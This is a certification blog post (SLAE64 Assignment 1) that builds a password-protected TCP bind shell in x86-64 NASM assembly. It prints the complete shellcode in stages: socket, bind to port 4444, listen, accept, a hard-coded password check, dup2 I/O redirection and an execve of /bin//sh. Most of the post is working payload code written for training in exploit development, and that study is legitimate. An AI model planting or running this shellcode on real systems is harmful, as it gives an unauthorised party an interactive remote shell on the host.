Title: SLAE64 - Assignment 1
Date: 2022-06-10T19:54:22.000Z

<h2 id="disclaimer">Disclaimer</h2><p>This blog post has been created for completing the requirements of the <em>SecurityTube Linux Assembly Expert Certification</em>:</p><p><a href="https://www.pentesteracademy.com/course?id=7">https://www.pentesteracademy.com/course?id=7</a></p><p>Student ID: <strong>PA-30398</strong></p><h2 id="source-code">Source code</h2><!--kg-card-begin: markdown--><p>The source code for this assignment is stored at the following link: <a href="https://github.com/rbctee/SlaeExam/tree/main/slae64/assignment/1/">rbctee/SlaeExam</a>.</p>
<p>There's only one file, named <code>bind_shell_tcp_password.nasm</code>, which is the NASM file containing the assembly code for a TCP bind shell protected by password.</p>
<!--kg-card-end: markdown--><h2 id="theory">Theory</h2><p>They say <em>a picture is worth a thousand words</em>, therefore I shall introduce the logic of a Bind Shell starting with a diagram.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="__GHOST_URL__/content/images/2022/06/image-10.png" class="kg-image" alt="Logic of a password-protected bind shell" loading="lazy" width="421" height="1142"><figcaption>Logic of a password-protected bind shell</figcaption></figure><p>The logic is pretty straightforward, so I'm only going to recapitulate what's shown in the figure above instead of describing each step in detail:</p><!--kg-card-begin: markdown--><ol>
<li>The shellcode needs to create a TCP socket object.</li>
<li>The shellcode needs to bind the newly created socket object to a TCP socket, i.e. a combination of IP address and port.</li>
<li>The shellcode listens for incoming connections and eventually accepts one from the attacker</li>
<li>The shellcode checks whether the password sent by the client is correct.
<ul>
<li>if the password is wrong, the bind shell is terminated</li>
<li>if the password is correct it redirects I/O and spawns a shell</li>
</ul>
</li>
</ol>
<!--kg-card-end: markdown--><p>Now that I have outlined the specific steps, it's time to delve into the practical details. </p><p>For each step, I'll provide an explanation and the relevant assembly code, along with some comments to help reading it.</p><h2 id="implementation">Implementation</h2><h3 id="socket-creation">Socket Creation</h3><p>As shown in the initial diagram, the first step one has to follow when writing a bind shell is to create a socket.</p><p>Since our bind shell is based on the TCP protocol, I'm going to create a simple TCP socket. </p><p>While on <strong>32-bit </strong>x86 systems you have to go through the syscall <code>sys_socketcall</code> to perform operations e.g., creating socket, or connecting to sockets,  on <strong>64-bit </strong>x86 systems there's a specific syscall for each operation.</p><p>In our case, the relevant syscall is named <code>sys_socket</code> in the figure below and it allows us to create various types of sockets (TCP, UDP, etc.):</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="__GHOST_URL__/content/images/2022/06/image-9.png" class="kg-image" alt="Syscall socket on x86-64 systems" loading="lazy" width="1453" height="410" srcset="__GHOST_URL__/content/images/size/w600/2022/06/image-9.png 600w, __GHOST_URL__/content/images/size/w1000/2022/06/image-9.png 1000w, __GHOST_URL__/content/images/2022/06/image-9.png 1453w" sizes="(min-width: 720px) 720px"><figcaption>Syscall <code>socket</code> on <code>x86-64</code> systems</figcaption></figure><p>This syscall accepts three arguments:</p><ol><li><strong><em>family</em> </strong>is an integer specifying the family of the socket; in my  case <code>AF_INET</code>, which indicates the <code>IPv4</code> protocol</li><li><em><strong>type </strong></em>indicates the type of socket, for example TCP or UDP</li><li><strong><em>protocol</em> </strong>indicates the protocol used for the specific type of socket; in this case there's only the TCP protocol</li></ol><p>Theory aside, the assembly code for creating a TCP socket is really short. If you focus on the size of your shellcode, you can fit under 15 bytes:</p><figure class="kg-card kg-code-card"><pre><code class="language-nasm">global _start

section .text

_start:

CreateSocket:

    ; clear registers for later usage
    xor rsi, rsi
    mul rsi

    ; 1st argument of socket(): communication domain
    ; in this case AF_INET, so it's based upon the IPv4 protocol
    push rdx
    pop rdi
    add rdi, 2
    
    ; 2nd argument of socket(): type of socket
    ; in this case: SOCK_STREAM, which means it uses the TCP protocol
    inc rsi

    ; 3rd argument: https://stackoverflow.com/questions/3735773/what-does-0-indicate-in-socket-system-call

    ; syscall socket()
    add eax, 41
    
    ; create socket and save the resulting file descriptor inside RAX
    syscall</code></pre><figcaption>Creating a TCP socket</figcaption></figure><p>If you were to debug the assembly instructions shown above and stop right after the <code>syscall</code> instruction, you may notice the creation of a new file descriptor, like this one:</p><pre><code class="language-bash">ls -la /proc/43453/fd/

lrwx------ 1 kali kali 64 Feb 28 16:16 /proc/43453/fd/3 -&gt; 'socket:[608794]'</code></pre><p>What the shellcode did is create a new file descriptor for the socket object. This is due to the fact that on Linux <em>everything is a file</em>, sockets too.</p><figure class="kg-card kg-bookmark-card"><a class="kg-bookmark-container" href="https://en.wikipedia.org/wiki/Everything_is_a_file"><div class="kg-bookmark-content"><div class="kg-bookmark-title">Everything is a file - Wikipedia</div><div class="kg-bookmark-description"></div><div class="kg-bookmark-metadata"><img class="kg-bookmark-icon" src="https://en.wikipedia.org/static/apple-touch/wikipedia.png" alt=""><span class="kg-bookmark-author">Wikimedia Foundation, Inc.</span><span class="kg-bookmark-publisher">Contributors to Wikimedia projects</span></div></div><div class="kg-bookmark-thumbnail"><img src="https://upload.wikimedia.org/wikipedia/en/thumb/9/99/Question_book-new.svg/50px-Question_book-new.svg.png" alt=""></div></a></figure><h3 id="socket-binding">Socket Binding</h3><p>Once the socket object is created, it's time to <strong>bind</strong> it to our socket of choice.</p><p>To perform this operation, we can use the homonymous syscall:</p><figure class="kg-card kg-bookmark-card"><a class="kg-bookmark-container" href="https://man7.org/linux/man-pages/man2/bind.2.html"><div class="kg-bookmark-content"><div class="kg-bookmark-title">bind(2) - Linux manual page</div><div class="kg-bookmark-description"></div><div class="kg-bookmark-metadata"><span class="kg-bookmark-author">Linux manual page</span></div></div><div class="kg-bookmark-thumbnail"><img src="https://man7.org/tlpi/cover/TLPI-front-cover-vsmall.png" alt=""></div></a></figure><p>It accepts three arguments:</p><ol><li><strong><em>sockfd</em> </strong>is the file descriptor of the socket created previously by means of the <code>socket</code> syscall</li><li><em><strong>addr</strong> </em>is a pointer to a <code>sockaddr</code> structure containing all the information to perform the binding, such as the IP address and the TCP port</li><li><strong><em>addrlen</em> </strong>indicates the length of the <code>sockaddr</code> structure, usually 16 bytes (including padding bytes)</li></ol><p>In the code below, I'm binding the created socket object to the socket<code>0.0.0.0:4444</code> to later listen for connections on all the IP addresses of the host.</p><figure class="kg-card kg-code-card"><pre><code class="language-nasm">BindSocket:

    ; save file descriptor inside RSI
    ; 1st argument of bind(): file descriptor of the socket to bind
    xchg rax, rdi

    ; INADDR_ANY (0x00000000)
    ; TCP port 4444
    ; 0x00002 -&gt; AF_INET
    mov esi, 0x5c11ffff
    xor si, 0xfffd
    push rsi

    ; 2nd argument of bind(): pointer to the sock_addr struct
    mov rsi, rsp
    mov r10, rsi

    ; 3rd argument of bind(): size of the struct
    add edx, 16

    ; syscall bind()
    xor eax, eax
    add rax, 49

    ; bind socket to 0.0.0.0:4444
    syscall</code></pre><figcaption>Binding the socket to the port <code>4444</code></figcaption></figure><h3 id="listening">Listening</h3><p>The next step involves the <code>listen</code> syscall, which marks the socket referred to by <em>sockfd</em> as a passive socket i.e., a socket that will be used to accept incoming connection requests using <code>accept()</code>.</p><figure class="kg-card kg-bookmark-card"><a class="kg-bookmark-container" href="https://man7.org/linux/man-pages/man2/listen.2.html"><div class="kg-bookmark-content"><div class="kg-bookmark-title">listen(2) - Linux manual page</div><div class="kg-bookmark-description"></div><div class="kg-bookmark-metadata"><span class="kg-bookmark-author">Linux manual page</span></div></div><div class="kg-bookmark-thumbnail"><img src="https://man7.org/tlpi/cover/TLPI-front-cover-vsmall.png" alt=""></div></a></figure><p>According to the Linux manual, the <em>listen</em> syscall accepts two arguments:</p><ol><li><strong><em>sockfd</em> </strong>is the file descriptor of the previously created TCP socket object</li><li><em><strong>backlog</strong></em> is an integer specifying the maximum number of clients allowed to connect to the socket, which in this case it's just one since there's no multi-threading involved</li></ol><p>Follows the assembly code relevant to this function:</p><figure class="kg-card kg-code-card"><pre><code class="language-nasm">Listen:

    ; 2nd argument of listen(): backlog (number of connections to accept), in this case just 1
    xor rsi, rsi
    mul rsi
    inc rsi

    ; 1st argument of listen(): file descriptor of the socket
    ; the value is already stored inside RDI

    ; syscall listen()
    add eax, 50

    ; call listen(fd, 1)
    syscall</code></pre><figcaption>Assembly routine for setting the socket as passive</figcaption></figure><h3 id="accepting-connections">Accepting Connections</h3><p>Once a socket is set as passive, it can accept incoming connections by calling the syscall <code>accept</code>:</p><figure class="kg-card kg-bookmark-card"><a class="kg-bookmark-container" href="https://man7.org/linux/man-pages/man2/accept.2.html"><div class="kg-bookmark-content"><div class="kg-bookmark-title">accept(2) - Linux manual page</div><div class="kg-bookmark-description"></div><div class="kg-bookmark-metadata"><span class="kg-bookmark-author">Linux manual page</span></div></div><div class="kg-bookmark-thumbnail"><img src="https://man7.org/tlpi/cover/TLPI-front-cover-vsmall.png" alt=""></div></a></figure><p>This one is a little more complicated than <code>listen</code>, since it has to store some data regarding the client socket.</p><p>First things first, the syscall accepts the following arguments:</p><ol><li><em><strong>sockfd </strong></em>is the file descriptor of the listening socket</li><li><em><strong>addr</strong></em> is a pointer to a <code>sockaddr</code> structure that, after calling <code>accept</code>, will contain data about the client such as the source IP address and the source TCP port</li><li><strong><em>addrlen</em> </strong>is an integer indicating the length of the sockaddr structure</li></ol><p>We can shorten the assembly code by cheating a little bit: setting the second and third arguments to <code>NULL</code>, since we don't really care about the source address of the client.</p><p>However, it could be useful if you wanted to implement some kind of check on the source IP or the source TCP port, for example to allow connections only from a specific IP address.</p><p>Below is the assembly code for this step:</p><figure class="kg-card kg-code-card"><pre><code class="language-nasm">AcceptIncomingConnection:

    ; 2nd and 3rd arguments of accept(): NULL and NULL
    ; according to the man pages, we can use this approach when
    ; we don't care about the address of the client
    xor eax, eax
    mov rsi, rax
    ; 1st argument should be unchanged

    ; syscall accept()
    add eax, 43

    ; invoke accept()
    syscall

    ; save file descriptor of the client socket for later usage (dup2)
    mov rdi, rax</code></pre><figcaption>Accepting an incoming connection</figcaption></figure><h3 id="password-protection">Password Protection</h3><p>As mentioned in the excerpt of this post, one of the requirements of the shellcode, besides being free of <code>NULL</code> bytes, is to be protected by a password.</p><p>We can achieve this by using the syscall <code>read</code> in order to read some bytes from the client and comparing them to a hard-coded password.</p><p>Doing this, once a client connects to the bind shell, it has to send the password before being able to execute commands on the remote system.</p><p>The syscall <code>read</code> is very basic:</p><figure class="kg-card kg-bookmark-card"><a class="kg-bookmark-container" href="https://man7.org/linux/man-pages/man2/read.2.html"><div class="kg-bookmark-content"><div class="kg-bookmark-title">read(2) - Linux manual page</div><div class="kg-bookmark-description"></div><div class="kg-bookmark-metadata"><span class="kg-bookmark-author">Linux manual page</span></div></div><div class="kg-bookmark-thumbnail"><img src="https://man7.org/tlpi/cover/TLPI-front-cover-vsmall.png" alt=""></div></a></figure><blockquote><strong>read</strong>() attempts to read up to <em><code>count</code></em> bytes from file descriptor <em><code>fd</code> </em>into the buffer starting at <em><code>buf</code></em>.</blockquote><p>It accepts three arguments:</p><ol><li><strong><em>fd</em> </strong>is the file descriptor from which to read bytes</li><li><em><strong>buf</strong></em> is the base address of the buffer that will contain the bytes read</li><li><strong><em>count</em> </strong>is the number of bytes to read</li></ol><p>To perform this kind of control, I wrote a routine named <code>CheckPassword</code>:</p><figure class="kg-card kg-code-card"><pre><code class="language-nasm">CheckPassword:

    ; 3rd argument of read(): number of bytes to read
    add rdx, 8

    ; allocate 8 bytes on the stack for storing the password
    sub rsp, rdx

    ; 2nd argument of read(): pointer to buffer which will store the
    ; bytes received from the client
    mov rsi, rsp

    ; 1st argument of read() (client socket) shoud be unchanged (RDI)

    ; syscall read()
    xor eax, eax

    ; call read()
    syscall

    pop rbx
    mov rax, 0x0a32322174636272
    xor rax, rbx
    jz IO_Redirection

ExitWrongPassword:

    xor eax, eax
    add eax, 60
    syscall</code></pre><figcaption>Checking the password sent by the client</figcaption></figure><p>If the flag <code>ZF</code> isn't set after the <code>XOR</code> operation, it means the password sent by the client is different from the hard-coded password (<code>rbct!22</code><em> </em>followed by a newline).</p><p>In that case, the shellcode enters the <code>ExitWrongPassword</code> routine, ending the execution of the shellcode.</p><h3 id="io-redirection">I/O Redirection</h3><p>Now you may ask: <em>why the need for I/O redirection? Can't we just spawn a shell and be done with it?</em></p><p>Well, the answer is <strong>no</strong>. If we were to spawn a shell right away, the input and the output of the shell would be bound to the local system.</p><p>This means that the attacker wouldn't be able to execute commands, as the input of the client socket won't be redirected to the system shell. </p><p>Similarly, the attacker wouldn't be able to receive the output of the commands executed from the shell since the output is not redirected to the client socket.</p><p>For this reason, we're going to redirect <em>input</em>, <em>output</em>, and <em>error</em>, in order to provide the attacker an interactive shell.</p><p>To do this, we can take advantage of the syscall <code>dup2</code>:</p><figure class="kg-card kg-bookmark-card"><a class="kg-bookmark-container" href="https://man7.org/linux/man-pages/man2/dup.2.html"><div class="kg-bookmark-content"><div class="kg-bookmark-title">dup(2) - Linux manual page</div><div class="kg-bookmark-description"></div><div class="kg-bookmark-metadata"><span class="kg-bookmark-author">Linux manual page</span></div></div><div class="kg-bookmark-thumbnail"><img src="https://man7.org/tlpi/cover/TLPI-front-cover-vsmall.png" alt=""></div></a></figure><p>In particular, using this syscall it's possible to redirect <code>stdin</code>, <code>stdout</code>, and <code>stderr</code> of the program running the shellcode towards the file descriptor of the client socket.</p><p>Follows the assembly code for this routine:</p><figure class="kg-card kg-code-card"><pre><code class="language-nasm">IO_Redirection:

    xor ecx, ecx
    mul rcx
    add ecx, 2

DuplicateFileDescriptor:

    ; 1st argument of dup2(), file descriptor of the client socket, should be unchanged (RDI)
    ; 2nd argument of dup2(): file descriptor to redirect: stdin/stdout/stderr
    ; in this case the value is stored inside RCX -&gt; 2,1,0
    push rcx
    
    ; syscall: dup2()
    push rdx
    pop rax
    add eax, 33

    ; 2nd argument of dup2(): file descriptor to redirect
    mov rsi, rcx

    ; call dup2()
    syscall

    pop rcx
    dec rcx
    jns DuplicateFileDescriptor</code></pre><figcaption>Redirection of input, output, and errors to the client socket</figcaption></figure><h3 id="spawning-a-shell">Spawning a Shell</h3><p>The final step consists of calling the syscall <code>system</code>, in order to execute a shell e.g., <code>/bin/sh</code> or <code>/bin/bash</code>.</p><p>Once the shellcode spawns the shell, thanks to the previous redirection of <em>stdin</em>, <em>stdout</em>, and <em>stderr</em>, the attacker will have an interactive prompt, as if they were in front of the terminal.</p><p>It means the client will be able to execute system commands, read output, and possible error messages.</p><figure class="kg-card kg-code-card"><pre><code class="language-nasm">SpawnSystemShell:

    ; clear RAX register (zero-sign extended)
    xor eax, eax

    ; NULL terminator for the string below
    push rax

    ; 3rd argument of execve: envp (in this case a pointer to NULL)
    mov rdx, rsp

    ; string "/bin//sh"
    mov rbx, 0x68732f2f6e69622f
    push rbx

    ; 1st argument of execve: executable to run
    mov rdi, rsp

    ; 2nd argument of execve: array of arguments passed to the executable
    push rax

    push rdi
    mov rsi, rsp

    ; syscall execve
    add eax, 0x3b

    ; invoke execve
    syscall</code></pre><figcaption>Spawning a shell</figcaption></figure><p>The screenshot below demonstrates the successful creation of a bind shell:</p><figure class="kg-card kg-image-card kg-width-wide kg-card-hascaption"><img src="__GHOST_URL__/content/images/2022/06/image-13.png" class="kg-image" alt loading="lazy" width="1866" height="416" srcset="__GHOST_URL__/content/images/size/w600/2022/06/image-13.png 600w, __GHOST_URL__/content/images/size/w1000/2022/06/image-13.png 1000w, __GHOST_URL__/content/images/size/w1600/2022/06/image-13.png 1600w, __GHOST_URL__/content/images/2022/06/image-13.png 1866w" sizes="(min-width: 1200px) 1200px"><figcaption>Password-protected Bind Shell Proof of Concept</figcaption></figure>